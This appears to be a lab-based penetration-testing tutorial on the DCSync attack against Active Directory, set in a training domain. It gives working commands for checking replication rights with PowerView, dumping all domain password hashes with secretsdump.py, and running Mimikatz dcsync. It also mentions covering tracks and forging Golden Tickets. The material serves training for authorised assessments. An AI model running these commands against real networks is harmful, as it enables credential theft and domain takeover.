## What is DCSync and How Does it Work?

DCSync is a technique for stealing the AD password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by DCs to replicate data. This allows an attacker to mimic a DC to retrieve user NTLM password hashes.

The crux of the attack is requesting a DC to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

We must have control over an account that has rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

### Viewing User's Replication Privileges Through ADSI Edit
![[adnunn_right_dcsync.webp]]

It is common during an assessment to find other accounts that have these rights, and once compromised, their access can be utilized to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords.

### Using Get-DomainUser to View User's Group Membership
```powershell-session
PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

We can confirm that the user has the necessary permissions with PowerView. We first get the SID in the above command and then check all ACLs set on the domain object using [Get-ObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainObjectAcl/). Here we search specifically for replication rights and check if our user possesses these rights.

### Using Get-ObjectAcl to Check User's Replication Rights
```powershell-session
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

If we had certain rights over the user (such as [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks. DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.

Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
```shell-session
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

- Number and % of passwords cracked
- top 10 passwords
- Password length metrics
- Password re-use

reflect only active user accounts in the domain.

If we check the files created using the `-just-dc` flag, we will see that there are three: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with [reversible encryption](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled.

While rare, we see accounts with these settings from time to time. It would typically be set to provide support for applications that use certain protocols that require a user's password to be used for authentication purposes.

### Viewing an Account with Reversible Encryption Password Storage Set
![[reverse_encrypt.webp]]

When this option is set, the passwords are stored using RC4 encryption, with the key needed stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a domain admin or equivalent. Tools such as `secretsdump.py` will decrypt those passwords while dumping the NTDS file either as a domain admin or using an attack such as DCSync. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed, even if this setting is disabled. We can enumerate this using the `Get-ADUser` cmdlet:

### Enumerating Further Using Get-ADUser
```powershell-session
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

We can check it with PowerView as well:

### Checking for Reversible Encryption Option Using Get-DomainUser
```powershell-session
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

Some organizations use it for all users to dump NTDS and perform periodic password strength audits.

We can use Mimikatz for the attack as well. To use Mimikatz we have to target a specific user. We could also target the `krbtgt` account and use this to create a `Golden Ticket` for persistence.

Mimikatz must be run in the context of the user with the DCSync privileges. We can utilize `runas.exe` to accomplish this:

### Using runus.exe
```cmd-session
C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
```

### Performing the Attack With Mimikatz
```powershell-session
PS C:\htb> .\mimikatz.exe

mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```